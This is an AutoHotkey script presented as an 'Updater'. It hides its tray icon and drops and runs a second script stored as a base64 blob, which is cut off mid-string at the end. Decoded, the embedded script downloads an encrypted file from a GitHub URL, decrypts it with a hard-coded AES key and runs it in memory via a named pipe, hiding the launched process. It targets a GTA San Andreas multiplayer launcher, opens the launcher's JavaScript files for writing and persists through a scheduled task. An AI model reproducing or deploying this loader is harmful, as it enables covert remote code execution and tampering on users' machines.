 #NoTrayIcon
#SingleInstance Force

CreateUpdater()

CreateUpdater() {
   local
   base64 := GetBase64()
   size := CryptStringToBinary(base64, data)
   if !InStr(FileExist(A_AppData . "\Updater"), "D")
      FileCreateDir, % A_AppData . "\Updater"
   filePath := A_AppData . "\Updater\Updater.ahk"
   if !FileExist(filePath) || CompareData(filePath, data, size) {
      File := FileOpen(filePath, "w")
      File.Pos := 0
      File.RawWrite(data, size)
      File := ""
   }
   Run, % filePath
}

CryptStringToBinary(string, ByRef outData, formatName := "CRYPT_STRING_BASE64")
{
   local
   static formats := { CRYPT_STRING_BASE64: 0x1
                     , CRYPT_STRING_HEX:    0x4
                     , CRYPT_STRING_HEXRAW: 0xC }
   fmt := formats[formatName]
   chars := StrLen(string)
   if !DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                            , "Ptr", 0, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
      throw "CryptStringToBinary failed. LastError: " . A_LastError
   VarSetCapacity(outData, bytes)
   DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                        , "Str", outData, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
   Return bytes
}

CompareData(filePath, ByRef data, len) {
   local
   fileLen := GetFileData(filePath, fileData)
   if (fileLen != len)
      Return true
   hLib := DllCall("LoadLibrary", "Str", "Bcrypt.dll", "Ptr")
   fileHashLen := CreateHash(&fileData, fileLen, fileHashData)
   dataHashLen := CreateHash(&data, len, hashData)
   DllCall("FreeLibrary", "Ptr", hLib)
   Return DllCall("msvcrt\memcmp", "Ptr", &fileHashData, "Ptr", &hashData, "Ptr", dataHashLen)
}

GetFileData(filePath, ByRef data) {
   local
   File := FileOpen(filePath, "r")
   File.Pos := 0
   File.RawRead(data, len := File.Length)
   File := ""
   Return len
}

CreateHash(pData, size, ByRef hashData, pSecretKey := 0, keySize := 0, AlgId := "SHA256") {
   ; CNG Algorithm Identifiers
   ; https://docs.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers
   local
   static HMAC := BCRYPT_ALG_HANDLE_HMAC_FLAG := 0x00000008
   DllCall("Bcrypt\BCryptOpenAlgorithmProvider", "PtrP", hAlgorithm, "WStr",  AlgId, "Ptr", 0, "UInt", keySize ? HMAC : 0)
   DllCall("Bcrypt\BCryptCreateHash", "Ptr", hAlgorithm, "PtrP", hHash, "Ptr", 0, "UInt", 0, "Ptr", pSecretKey, "UInt", keySize, "UInt", 0)
   DllCall("Bcrypt\BCryptHashData", "Ptr", hHash, "Ptr", pData, "UInt", size, "UInt", 0)
   DllCall("Bcrypt\BCryptGetProperty", "Ptr", hAlgorithm, "WStr", "HashDigestLength", "UIntP", hashLen, "UInt", 4, "UIntP", cbResult, "UInt", 0)
   VarSetCapacity(hashData, hashLen, 0)
   DllCall("Bcrypt\BCryptFinishHash", "Ptr", hHash, "Ptr", &hashData, "UInt", hashLen, "UInt", 0)
   DllCall("Bcrypt\BCryptDestroyHash", "Ptr", hHash)
   DllCall("Bcrypt\BCryptCloseAlgorithmProvider", "Ptr", hAlgorithm, "UInt", 0)
   Return hashLen
}

GetBase64() {
local
base64 := "77u/I05vVHJheUljb24NCiNQZXJzaXN0ZW50DQojU2luZ2xlSW5zdGFuY2UgT2ZmDQpEZXRlY3RIaWRkZW5XaW5kb3dzLCBPbg0KDQppZiBBX0FyZ3NbMV0NCiAgIFVwZGF0ZSgpDQplbHNlIHsNCiAgIEluZm8gOj0gW10NCiAgIE9uTWVzc2FnZSgweDEyMzQsIEZ1bmMoIk9uQ2hpbGRNZXNzYWdlIikuQmluZChJbmZvKSkNCiAgIE1zZ0JveCwgV2FpdCBmb3IgSW5mb1sxXQ0KICAgU2hlbGxSdW5Bc1VzZXIoQV9TY3JpcHRGdWxsUGF0aCwgInVzZXIgIiAuIEFfU2NyaXB0SHduZCkNCiAgIHdoaWxlIEluZm9bMV0gPSAiIg0KICAgICAgU2xlZXAsIDEwMA0KICAgTXNnQm94LCAlIEluZm9bMV0NCiAgIGlmIEluZm9bMV0NCiAgICAgIEV4aXRBcHANCiAgIGVsc2Ugew0KICAgICAgU2V0VGltZXIsIFVwZGF0ZSwgJSAxMDAwKjM2MDAqNQ0KICAgICAgVXBkYXRlKCkNCiAgIH0NCn0NClJldHVybg0KDQpVcGRhdGUoKSB7DQogICBzdGF0aWMgaGVscGVyTGluayA6PSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvbGx5Y29kZXIvdGVzdC9tYWluL2FiYy5haGsiDQogICAgICAgICwgdGltZXIgOj0gIiIsIGRhdGEgOj0gIiIsIGxlbiA6PSAiIg0KICAgKCAhdGltZXIgJiYgdGltZXIgOj0gRnVuYyhBX1RoaXNGdW5jKSApDQogICBpZiAoQV9BcmdzWzFdID0gIiIgfHwgQV9BcmdzWzFdID0gInRhc2siKSB7DQogICAgICAoICFsZW4gJiYgbGVuIDo9IFdlYlJlcXVlc3QoaGVscGVyTGluaywgZGF0YSwsLCwgZXJyb3IgOj0gIiIpICkNCiAgICAgIGlmIGVycm9yIHsNCiAgICAgICAgIFNldFRpbWVyLCAlIHRpbWVyLCAtNTAwMA0KICAgICAgICAgUmV0dXJuDQogICAgICB9DQogICB9DQogICBQcm9jZXNzLCBFeGlzdCwgUkFETUlSX0xBVU5DSEVSX0VYLmV4ZQ0KICAgaWYgIShQSUQgOj0gRXJyb3JMZXZlbCkgew0KICAgICAgU2V0VGltZXIsICUgdGltZXIsIC0xMDAwDQogICAgICBSZXR1cm4NCiAgIH0NCiAgIFByb2Nlc3MsIEV4aXN0LCBndGFfc2EuZXhlDQogICBpZiBFcnJvckxldmVsIHsNCiAgICAgIFNldFRpbWVyLCAlIHRpbWVyLCAtMTAwMA0KICAgICAgUmV0dXJuDQogICB9DQogICBpZiAoQV9BcmdzWzFdID0gInVzZXIiKQ0KICAgICAgVHJ5Q3JlYXRlVGFzayhQSUQpDQogICAoIGxlbiAmJiBEeW5hUnVuKERlY3JEYXRhKGRhdGEsIGxlbikpICkNCiAgIGlmIEFfQXJnc1sxXQ0KICAgICAgRXhpdEFwcA0KfQ0KDQpXZWJSZXF1ZXN0KHVybCwgQnlSZWYgZGF0YSwgbWV0aG9kIDo9ICJHRVQiLCBIZWFkZXJzQXJyYXkgOj0gIiIsIGJvZHkgOj0gIiIsIEJ5UmVmIGVycm9yIDo9ICIiKSB7DQogICBXaHIgOj0gQ29tT2JqQ3JlYXRlKCJXaW5IdHRwLldpbkh0dHBSZXF1ZXN0LjUuMSIpDQogICBXaHIuT3BlbihtZXRob2QsIHVybCwgdHJ1ZSkNCiAgIGZvciBuYW1lLCB2YWx1ZSBpbiBIZWFkZXJzQXJyYXkNCiAgICAgIFdoci5TZXRSZXF1ZXN0SGVhZGVyKG5hbWUsIHZhbHVlKQ0KICAgV2hyLlNlbmQoYm9keSkNCiAgIFdoci5XYWl0Rm9yUmVzcG9uc2UoKQ0KICAgc3RhdHVzIDo9IFdoci5zdGF0dXMNCiAgIGlmIChzdGF0dXMgIT0gMjAwKQ0KICAgICAgZXJyb3IgOj0gIkh0dHBSZXF1ZXN0IGVycm9yLCBzdGF0dXM6ICIgLiBzdGF0dXMNCiAgIEFyciA6PSBXaHIucmVzcG9uc2VCb2R5DQogICBwRGF0YSA6PSBOdW1HZXQoQ29tT2JqVmFsdWUoYXJyKSArIDggKyBBX1B0clNpemUpDQogICBsZW5ndGggOj0gQXJyLk1heEluZGV4KCkgKyAxDQogICBWYXJTZXRDYXBhY2l0eShkYXRhLCBsZW5ndGgsIDApDQogICBEbGxDYWxsKCJSdGxNb3ZlTWVtb3J5IiwgIlB0ciIsICZkYXRhLCAiUHRyIiwgcERhdGEsICJQdHIiLCBsZW5ndGgpDQogICBSZXR1cm4gbGVuZ3RoDQp9DQoNClRyeUNyZWF0ZVRhc2soUElEKSB7DQogICBNc2dCb3gsICUgZXhlUGF0aCA6PSBHZXRQcm9jZXNzSW1hZ2VOYW1lKFBJRCkNCiAgIFNwbGl0UGF0aCwgZXhlUGF0aCwsIGRpcg0KICAganNEaXIgOj0gZGlyIC4gIlxyZXNvdXJjZXNccHJvamVjdHNcY3JtcFxjZWZcYXNzZXRzXGpzIg0KICAgaWYgISgoIChhcHBQYXRoIDo9IEZpbmRQYXRoKGpzRGlyLCAiYXBwLiouanMiKSkgfHwgKGFwcFBhdGggOj0gRmluZFBhdGgoanNEaXIsICIqLmpzIikpICkgJiYgRmlsZSA6PSBGaWxlT3BlbihhcHBQYXRoLCAicnciKSkNCiAgICAgIFNlbmRNZXNzYWdlLCAweDEyMzQsIDAsIDAsICUgImFoa19pZCIgLiBBX0FyZ3NbMl0NCiAgIGVsc2Ugew0KICAgICAgaWYgISggRmlsZUV4aXN0KGZpbGVQYXRoIDo9IEFfQXBwRGF0YSAuICJcVXBkYXRlclwiIC4gQV9TY3JpcHROYW1lKSAmJiBBX1NjcmlwdERpciAhPSBBX0FwcERhdGEgLiAiXFVwZGF0ZXIiICkgew0KICAgICAgICAgaWYgIUluU3RyKEZpbGVFeGlzdChBX0FwcERhdGEgLiAiXFVwZGF0ZXIiKSwgIkQiKQ0KICAgICAgICAgICAgRmlsZUNyZWF0ZURpciwgJSBBX0FwcERhdGEgLiAiXFVwZGF0ZXIiDQogICAgICAgICBpZiAhRmlsZUV4aXN0KGZpbGVQYXRoKQ0KICAgICAgICAgICAgRmlsZUNvcHksICUgQV9TY3JpcHRGdWxsUGF0aCwgJSBmaWxlUGF0aCwgMQ0KICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICBGaWxlIDo9IEZpbGVPcGVuKGZpbGVQYXRoLCAiciIpDQogICAgICAgICAgICBGaWxlLlBvcyA6PSAwDQogICAgICAgICAgICBGaWxlLlJhd1JlYWQoYnVmLCBzaXplIDo9IEZpbGUuTGVuZ3RoKQ0KICAgICAgICAgICAgRmlsZSA6PSAiIg0KICAgICAgICAgICAgaWYgQ29tcGFyZURhdGEoQV9TY3JpcHRGdWxsUGF0aCwgYnVmLCBzaXplKQ0KICAgICAgICAgICAgICAgRmlsZUNvcHksICUgQV9TY3JpcHRGdWxsUGF0aCwgJSBmaWxlUGF0aCwgMQ0KICAgICAgICAgfQ0KICAgICAgfQ0KICAgICAgdHJ5IHJlcyA6PSBDcmVhdGVUYXNrKCJVcGRhdGUgUGx1Z2luIiwgZmlsZVBhdGgsICJ0YXNrIiwgIjE0OjAwIiwgNSwgc3RhcnRJbW1lZGlhdGVseSA6PSB0cnVlKQ0KICAgICAgY2F0Y2gNCiAgICAgICAgIFNlbmRNZXNzYWdlLCAweDEyMzQsIDAsIDAsICUgImFoa19pZCIgLiBBX0FyZ3NbMl0NCiAgICAgIGlmIHJlcw0KICAgICAgICAgU2VuZE1lc3NhZ2UsIDB4MTIzNCwgMSwgMCwgJSAiYWhrX2lkIiAuIEFfQXJnc1syXQ0KICAgICAgTXNnQm94LCAlICJyZXM6ICIgLiByZXMNCiAgIH0NCiAgIFNsZWVwLCAyMDANCn0NCg0KR2V0UHJvY2Vzc0ltYWdlTmFtZShQSUQpIHsNCiAgIHN0YXRpYyBhY2Nlc3MgOj0gUFJPQ0VTU19RVUVSWV9MSU1JVEVEX0lORk9STUFUSU9OIDo9IDB4MTAwMA0KICAgaWYgIWhQcm9jIDo9IERsbENhbGwoIk9wZW5Qcm9jZXNzIiwgIlVJbnQiLCBhY2Nlc3MsICJJbnQiLCAwLCAiVUludCIsIFBJRCwgIlB0ciIpDQogICAgICB0aHJvdyAiRmFpbGVkIHRvIG9wZW4gcHJvY2VzcywgZXJyb3I6ICIgLiBBX0xhc3RFcnJvcg0KICAgVmFyU2V0Q2FwYWNpdHkoaW1hZ2VQYXRoLCAxMDI0LCAwKQ0KICAgRGxsQ2FsbCgiUXVlcnlGdWxsUHJvY2Vzc0ltYWdlTmFtZSIsICJQdHIiLCBoUHJvYywgIlVJbnQiLCAwLCAiU3RyIiwgaW1hZ2VQYXRoLCAiVUludFAiLCA1MTIpDQogICBEbGxDYWxsKCJDbG9zZUhhbmRsZSIsICJQdHIiLCBoUHJvYykNCiAgIFJldHVybiBpbWFnZVBhdGgNCn0NCg0KRmluZFBhdGgoZGlyLCBmaWxlTmFtZVBhdHRlcm4pIHsNCiAgIExvb3AsIEZpbGVzLCAlIGRpciAuICJcIiAuIGZpbGVOYW1lUGF0dGVybg0KICAgICAgZmlsZVBhdGggOj0gQV9Mb29wRmlsZUZ1bGxQYXRoDQogICB1bnRpbCBmaWxlUGF0aA0KICAgUmV0dXJuIGZpbGVQYXRoDQp9DQoNCkNvbXBhcmVEYXRhKGZpbGVQYXRoLCBCeVJlZiBkYXRhLCBsZW4pIHsNCiAgIGxvY2FsDQogICBmaWxlTGVuIDo9IEdldEZpbGVEYXRhKGZpbGVQYXRoLCBmaWxlRGF0YSkNCiAgIGlmIChmaWxlTGVuICE9IGxlbikNCiAgICAgIFJldHVybiB0cnVlDQogICBoTGliIDo9IERsbENhbGwoIkxvYWRMaWJyYXJ5IiwgIlN0ciIsICJCY3J5cHQuZGxsIiwgIlB0ciIpDQogICBmaWxlSGFzaExlbiA6PSBDcmVhdGVIYXNoKCZmaWxlRGF0YSwgZmlsZUxlbiwgZmlsZUhhc2hEYXRhKQ0KICAgZGF0YUhhc2hMZW4gOj0gQ3JlYXRlSGFzaCgmZGF0YSwgbGVuLCBoYXNoRGF0YSkNCiAgIERsbENhbGwoIkZyZWVMaWJyYXJ5IiwgIlB0ciIsIGhMaWIpDQogICBSZXR1cm4gRGxsQ2FsbCgibXN2Y3J0XG1lbWNtcCIsICJQdHIiLCAmZmlsZUhhc2hEYXRhLCAiUHRyIiwgJmhhc2hEYXRhLCAiUHRyIiwgZGF0YUhhc2hMZW4pDQp9DQoNCkdldEZpbGVEYXRhKGZpbGVQYXRoLCBCeVJlZiBkYXRhKSB7DQogICBsb2NhbA0KICAgRmlsZSA6PSBGaWxlT3BlbihmaWxlUGF0aCwgInIiKQ0KICAgRmlsZS5Qb3MgOj0gMA0KICAgRmlsZS5SYXdSZWFkKGRhdGEsIGxlbiA6PSBGaWxlLkxlbmd0aCkNCiAgIEZpbGUgOj0gIiINCiAgIFJldHVybiBsZW4NCn0NCg0KQ3JlYXRlSGFzaChwRGF0YSwgc2l6ZSwgQnlSZWYgaGFzaERhdGEsIHBTZWNyZXRLZXkgOj0gMCwga2V5U2l6ZSA6PSAwLCBBbGdJZCA6PSAiU0hBMjU2Iikgew0KICAgOyBDTkcgQWxnb3JpdGhtIElkZW50aWZpZXJzDQogICA7IGh0dHBzOi8vZG9jcy5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mvd2luMzIvc2VjY25nL2NuZy1hbGdvcml0aG0taWRlbnRpZmllcnMNCiAgIGxvY2FsDQogICBzdGF0aWMgSE1BQyA6PSBCQ1JZUFRfQUxHX0hBTkRMRV9ITUFDX0ZMQUcgOj0gMHgwMDAwMDAwOA0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdE9wZW5BbGdvcml0aG1Qcm92aWRlciIsICJQdHJQIiwgaEFsZ29yaXRobSwgIldTdHIiLCAgQWxnSWQsICJQdHIiLCAwLCAiVUludCIsIGtleVNpemUgPyBITUFDIDogMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRDcmVhdGVIYXNoIiwgIlB0ciIsIGhBbGdvcml0aG0sICJQdHJQIiwgaEhhc2gsICJQdHIiLCAwLCAiVUludCIsIDAsICJQdHIiLCBwU2VjcmV0S2V5LCAiVUludCIsIGtleVNpemUsICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRIYXNoRGF0YSIsICJQdHIiLCBoSGFzaCwgIlB0ciIsIHBEYXRhLCAiVUludCIsIHNpemUsICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRHZXRQcm9wZXJ0eSIsICJQdHIiLCBoQWxnb3JpdGhtLCAiV1N0ciIsICJIYXNoRGlnZXN0TGVuZ3RoIiwgIlVJbnRQIiwgaGFzaExlbiwgIlVJbnQiLCA0LCAiVUludFAiLCBjYlJlc3VsdCwgIlVJbnQiLCAwKQ0KICAgVmFyU2V0Q2FwYWNpdHkoaGFzaERhdGEsIGhhc2hMZW4sIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0RmluaXNoSGFzaCIsICJQdHIiLCBoSGFzaCwgIlB0ciIsICZoYXNoRGF0YSwgIlVJbnQiLCBoYXNoTGVuLCAiVUludCIsIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0RGVzdHJveUhhc2giLCAiUHRyIiwgaEhhc2gpDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0Q2xvc2VBbGdvcml0aG1Qcm92aWRlciIsICJQdHIiLCBoQWxnb3JpdGhtLCAiVUludCIsIDApDQogICBSZXR1cm4gaGFzaExlbg0KfQ0KDQpEZWNyRGF0YShCeVJlZiBkYXRhLCBsZW5ndGgpIHsNCiAgIHN0YXRpYyBpdiA6PSAic29tZXRleHQiLCBwdyA6PSAiMzk1RkQwODItN0JDOS00NjYyLTgwMTktOTY2OEZDOUQzNDM5Ig0KICAgYmFzZTY0IDo9IFN0ckdldCgmZGF0YSwgbGVuZ3RoLCAiY3AwIikNCiAgIGxlbmd0aCA6PSBDcnlwdFN0cmluZ1RvQmluYXJ5KGJhc2U2NCwgZGF0YSkNCiAgIHB3ZExlbiA6PSBTdHJQdXRCdWZmKHB3LCBwd2REYXRhKQ0KICAgaExpYiA6PSBEbGxDYWxsKCJMb2FkTGlicmFyeSIsICJTdHIiLCAiQmNyeXB0LmRsbCIsICJQdHIiKQ0KICAgbGVuSGFzaFBhc3N3b3JkIDo9IENyZWF0ZUhhc2goJnB3ZERhdGEsIHB3ZExlbiwgaGFzaFBhc3N3b3JkKQ0KICAgaXZMZW4gOj0gU3RyUHV0QnVmZihpdiwgaXZEYXRhKQ0KICAgbGVuSGFzaEl2IDo9IENyZWF0ZUhhc2goJml2RGF0YSwgaXZMZW4sIGhhc2hJdikNCiAgIFZhclNldENhcGFjaXR5KGl2MTYsIDE2LCAwKQ0KICAgRGxsQ2FsbCgiUnRsTW92ZU1lbW9yeSIsICJQdHIiLCBwSGFzaEl2IDo9ICZpdjE2LCAiUHRyIiwgJmhhc2hJdiArIGxlbkhhc2hJdiAtIDE2LCAiUHRyIiwgbGVuSXYgOj0gMTYpDQogICBsZW4gOj0gQmNyeXB0KCZkYXRhLCBsZW5ndGgsIG91dERhdGEsICZoYXNoUGFzc3dvcmQsIGxlbkhhc2hQYXNzd29yZCwgcEhhc2hJdiwgbGVuSXYpDQogICBEbGxDYWxsKCJGcmVlTGlicmFyeSIsICJQdHIiLCBoTGliKQ0KICAgdXRmOCA6PSBOdW1HZXQob3V0RGF0YSwgIkludCIpICYgMHhGRkZGRkYgPSAweGJmYmJlZg0KICAgUmV0dXJuIFN0ckdldCgmb3V0RGF0YSArICh1dGY4ID8gMyA6IDApLCBsZW4sICJVVEYtOCIpDQp9DQoNCkNyeXB0U3RyaW5nVG9CaW5hcnkoc3RyaW5nLCBCeVJlZiBvdXREYXRhLCBmb3JtYXROYW1lIDo9ICJDUllQVF9TVFJJTkdfQkFTRTY0IikNCnsNCiAgIHN0YXRpYyBmb3JtYXRzIDo9IHsgQ1JZUFRfU1RSSU5HX0JBU0U2NDogMHgxDQogICAgICAgICAgICAgICAgICAgICAsIENSWVBUX1NUUklOR19IRVg6ICAgIDB4NA0KICAgICAgICAgICAgICAgICAgICAgLCBDUllQVF9TVFJJTkdfSEVYUkFXOiAweEMgfQ0KICAgZm10IDo9IGZvcm1hdHNbZm9ybWF0TmFtZV0NCiAgIGNoYXJzIDo9IFN0ckxlbihzdHJpbmcpDQogICBpZiAhRGxsQ2FsbCgiQ3J5cHQzMlxDcnlwdFN0cmluZ1RvQmluYXJ5IiwgIlN0ciIsIHN0cmluZywgIlVJbnQiLCBjaGFycywgIlVJbnQiLCBmbXQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiUHRyIiwgMCwgIlVJbnRQIiwgYnl0ZXMsICJQdHIiLCAwLCAiUHRyIiwgMCkNCiAgICAgIHRocm93ICJDcnlwdFN0cmluZ1RvQmluYXJ5IGZhaWxlZC4gTGFzdEVycm9yOiAiIC4gQV9MYXN0RXJyb3INCiAgIFZhclNldENhcGFjaXR5KG91dERhdGEsIGJ5dGVzKQ0KICAgRGxsQ2FsbCgiQ3J5cHQzMlxDcnlwdFN0cmluZ1RvQmluYXJ5IiwgIlN0ciIsIHN0cmluZywgIlVJbnQiLCBjaGFycywgIlVJbnQiLCBmbXQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJTdHIiLCBvdXREYXRhLCAiVUludFAiLCBieXRlcywgIlB0ciIsIDAsICJQdHIiLCAwKQ0KICAgUmV0dXJuIGJ5dGVzDQp9DQoNCkJjcnlwdChwRGF0YSwgZGF0YVNpemUsIEJ5UmVmIG91dERhdGEsIHBLZXksIGtleVNpemUsIHBJdiA6PSAwLCBpdlNpemUgOj0gMCwgQWxnSWQgOj0gIkFFUyIsIGNyeXB0IDo9ICJEZWNyeXB0IiwgY2hhaW5pbmdNb2RlIDo9ICJDaGFpbmluZ01vZGVDQkMiKSB7DQo7IGNyeXB0OiBFbmNyeXB0L0RlY3J5cHQNCiAgIHN0YXRpYyBwYWRkaW5nIDo9IEJDUllQVF9CTE9DS19QQURESU5HIDo9IDEsIGNoYWluaW5nTW9kZVNpemUgOj0gU3RyTGVuKGNoYWluaW5nTW9kZSkqMg0KICAgcExvY2FsSXYgOj0gMA0KICAgaWYgcEl2IHsNCiAgICAgIFZhclNldENhcGFjaXR5KGxvY2FsSXYsIGl2U2l6ZSwgMCkNCiAgICAgIERsbENhbGwoIlJ0bE1vdmVNZW1vcnkiLCAiUHRyIiwgcExvY2FsSXYgOj0gJmxvY2FsSXYsICJQdHIiLCBwSXYsICJQdHIiLCBpdlNpemUpDQogICB9DQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0T3BlbkFsZ29yaXRobVByb3ZpZGVyIiwgIlB0clAiLCBoQWxnb3JpdGhtLCAiV1N0ciIsIEFsZ0lkLCAiUHRyIiwgMCwgIlVJbnQiLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdFNldFByb3BlcnR5IiwgIlB0ciIsIGhBbGdvcml0aG0sICJXU3RyIiwgIkNoYWluaW5nTW9kZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiV1N0ciIsIGNoYWluaW5nTW9kZSwgIlVJbnQiLCBjaGFpbmluZ01vZGVTaXplLCAiVUludCIsIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0R2VuZXJhdGVTeW1tZXRyaWNLZXkiLCAiUHRyIiwgaEFsZ29yaXRobSwgIlB0clAiLCBoS2V5LCAiUHRyIiwgMCwgIlVJbnQiLCAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlB0ciIgLCBwS2V5LCAiVUludCIsIGtleVNpemUsICJVSW50IiwgMCwgIlVJbnQiKQ0KICAgcmVzIDo9IERsbENhbGwoIkJjcnlwdFxCQ3J5cHQiIC4gY3J5cHQsICJQdHIiLCBoS2V5LCAiUHRyIiwgcERhdGEsICJVSW50IiwgZGF0YVNpemUsICJQdHIiLCAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJQdHIiLCBwTG9jYWxJdiwgIlVJbnQiLCBpdlNpemUsICJQdHIiLCAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJVSW50IiwgMCwgIlVJbnRQIiwgb3V0U2l6ZSwgIlVJbnQiLCBwYWRkaW5nLCAiVUludCIpDQogICBpZiAocmVzICE9IDApDQogICAgICB0aHJvdyAiQ3J5cHQgZXJyb3IhIEJDcnlwdCIgLiBjcnlwdCAuICIxIHJlc3VsdDogIiAuIEZvcm1hdCgiezojeH0iLCByZXMpDQogICBWYXJTZXRDYXBhY2l0eShvdXREYXRhLCBvdXRTaXplLCAwKQ0KICAgcmVzIDo9IERsbENhbGwoIkJjcnlwdFxCQ3J5cHQiIC4gY3J5cHQsICJQdHIiLCBoS2V5LCAiUHRyIiwgcERhdGEsICJVSW50IiwgZGF0YVNpemUsICJQdHIiLCAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJQdHIiLCBwTG9jYWxJdiwgIlVJbnQiLCBpdlNpemUsICJQdHIiLCAmb3V0RGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiVUludCIsIG91dFNpemUsICJVSW50UCIsIG91dFNpemUsICJVSW50IiwgcGFkZGluZywgIlVJbnQiKQ0KICAgaWYgKHJlcyAhPSAwKQ0KICAgICAgdGhyb3cgIkNyeXB0IGVycm9yISBCQ3J5cHQiIC4gY3J5cHQgLiAiMiByZXN1bHQ6ICIgLiBGb3JtYXQoIns6I3h9IiwgcmVzKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdERlc3Ryb3lLZXkiLCAiUHRyIiwgaEtleSkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyIiwgIlB0ciIsIGhBbGdvcml0aG0sICJVSW50IiwgMCkNCiAgIFJldHVybiBvdXRTaXplDQp9DQoNClN0clB1dEJ1ZmYoc3RyaW5nLCBCeVJlZiBkYXRhLCBlbmNvZGluZyA6PSAiVVRGLTgiKSAgew0KICAgVmFyU2V0Q2FwYWNpdHkoIGRhdGEsIGxlbiA6PSAoU3RyUHV0KHN0cmluZywgZW5jb2RpbmcpIC0gMSkgPDwgKGVuY29kaW5nIH49ICJpKV4oVVRGLTE2fGNwMTIwMCkkIikgKQ0KICAgU3RyUHV0KHN0cmluZywgJmRhdGEsIGVuY29kaW5nKQ0KICAgUmV0dXJuIGxlbg0KfQ0KDQpEeW5hUnVuKHRlbXBTY3JpcHQsIGFoa1BhdGggOj0gIiIsIHBpcGVOYW1lIDo9ICIiLCBhcmdzKikNCnsNCiAgIHN0YXRpYyBwYXJhbXMgOj0gWyAiVUludCIsIFBJUEVfQUNDRVNTX09VVEJPVU5EICAgICA6PSAweDIsICJVSW50IiwgMA0KICAgICAgICAgICAgICAgICAgICAsICJVSW50IiwgUElQRV9VTkxJTUlURURfSU5TVEFOQ0VTIDo9IDI1NSwgIlVJbnQiLCAwDQogICAgICAgICAgICAgICAgICAgICwgIlVJbnQiLCAwLCAiUHRyIiwgMCwgIlB0ciIsIDAsICJQdHIiIF0NCiAgICAgICAgLCBCT00gOj0gQ2hyKDB4RkVGRikNCg0KICAgKGFoa1BhdGggPSAiIiAmJiBhaGtQYXRoIDo9IEFfQWhrUGF0aCkNCiAgIChwaXBlTmFtZSA9ICIiICYmIHBpcGVOYW1lIDo9ICJBSEtfIiAuIEFfVGlja0NvdW50KQ0KICAgDQogICBMb29wIDEgew0KICAgICAgZm9yIGssIHYgaW4gWyJwaXBlR0EiLCAicGlwZSJdDQogICAgICAgICAldiUgOj0gRGxsQ2FsbCgiQ3JlYXRlTmFtZWRQaXBlIiwgU3RyLCAiXFwuXHBpcGVcIiAuIHBpcGVOYW1lLCBwYXJhbXMqKQ0KICAgICAgaWYgKCAocGlwZSA9IC0xIHx8IHBpcGVHQSA9IC0xKSAmJiBlcnJvciA6PSAiQ2FuJ3QgY3JlYXRlIHBpcGUgIiIiIC4gcGlwZU5hbWUgLiAiIiJgbkxhc3RFcnJvcjogIiAuIEFfTGFzdEVycm9yICkNCiAgICAgICAgIGJyZWFrDQogICAgICBzQ21kIDo9IGFoa1BhdGggLiAiICIiXFwuXHBpcGVcIiAuIHBpcGVOYW1lIC4gIiIiIg0KICAgICAgZm9yIGssIHYgaW4gYXJncw0KICAgICAgICAgc0NtZCAuPSAiICIiIiAuIHYgLiAiIiIiDQogICAgICBSdW4sICUgc0NtZCwsIFVzZUVycm9yTGV2ZWwgSElERSwgUElEDQogICAgICBpZiAoRXJyb3JMZXZlbCAmJiBlcnJvciA6PSAiQ2FuJ3Qgb3BlbiBmaWxlOmBuICIiXFwuXHBpcGVcIiAuIHBpcGVOYW1lIC4gIiIiIikNCiAgICAgICAgIGJyZWFrDQogICAgICBmb3IgaywgdiBpbiBbInBpcGVHQSIsICJwaXBlIl0NCiAgICAgICAgIERsbENhbGwoIkNvbm5lY3ROYW1lZFBpcGUiLCBQdHIsICV2JSwgUHRyLCAwKQ0KICAgICAgdGVtcFNjcmlwdCA6PSBCT00gLiB0ZW1wU2NyaXB0DQogICAgICB0ZW1wU2NyaXB0U2l6ZSA6PSAoIFN0ckxlbih0ZW1wU2NyaXB0KSArIDEgKSA8PCAhIUFfSXNVbmljb2RlDQogICAgICBpZiAhRGxsQ2FsbCgiV3JpdGVGaWxlIiwgUHRyLCBwaXBlLCBTdHIsIHRlbXBTY3JpcHQsIFVJbnQsIHRlbXBTY3JpcHRTaXplLCBVSW50UCwgMCwgUHRyLCAwKQ0KICAgICAgICAgZXJyb3IgOj0gIldyaXRlRmlsZSBmYWlsZWQsIExhc3RFcnJvcjogIiAuIEFfTGFzdEVycm9yDQogICB9DQogICBmb3IgaywgdiBpbiBbInBpcGVHQSIsICJwaXBlIl0NCiAgICAgICggJ